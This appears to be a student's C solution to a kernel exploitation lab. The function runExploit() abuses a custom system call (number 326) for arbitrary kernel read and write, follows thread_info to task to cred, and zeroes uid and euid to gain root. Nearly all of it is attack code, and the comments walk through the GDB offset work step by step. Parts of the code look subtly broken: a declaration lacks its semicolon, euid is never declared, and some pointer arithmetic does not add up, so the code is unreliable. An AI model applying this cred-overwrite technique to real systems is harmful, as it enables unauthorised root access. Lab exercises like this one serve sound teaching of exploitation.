void runExploit() {
    long* thread_info
    unsigned long task, cred, uid;

    // First, locate thread info using provided system call. Check kernel source code.
    syscall(326,0,NULL); //reset node array with 1 head node

    // Next, you need to find thread_info->task->cred
    //
    // 1.  Use GDB to calculate the offset in the structure and find what is the relationship between thread_info and thread_info->task, struct task and task->cred, struct cred and cred->uid/cred->euid.
    //     For example:
    //     (gdb) print (int)&((struct thread_info*)0)->task
    //     will gives you the offset between struct thread_info and  thread_info->task
    //     
    //          thread_info -> task = 0
    //          task_struct -> cred = 1456
    //          cred -> uid = 4
    //          cred -> euid = 20;
    //
    // 2. Then you can make use of arbitrary read to get the address of struct task.
    thread_info = syscall(326, 4, NULL);
    syscall(326, 2, thread_info - 4); //shift 4 bytes; modified previous pointer as thread_info
    task = syscall(326, 3, NULL); //thread_info now points to task

    // 3. Similarly, you can get the address of struct cred, uid/euid finally with the help of arbitrary read.
    syscall(326, 2, task + 1456 - 4);
    cred = syscall(326, 3, NULL); //thread_info now points to cred

    uid = cred + 4;
    euid = cred + 20;

    // Finally, you will need to rewrite the uid/euid in cred struct and give your process highest privilege
    syscall(326, 1, 256);      //Since next in node_before->next = idx is only 1 bye (8 bits), we need to add 256 to the size of idx to overwrite the value to zero.

    syscall(326, 2, uid - 8);  //Set abitrary address; setting the previous pointer to 9 bytes before address of uid.
    uid = syscall(326, 3, NULL); //get correct address od uid
    syscall(326, 1, uid - 4);  //Adding node; overwriting uid with 4 bytes (1000) to contain only zeros as IDs only contain 4 bytes.

    syscall(326, 2, euid - 8);
    syscall(326, 1, euid - 20);
    return;
}
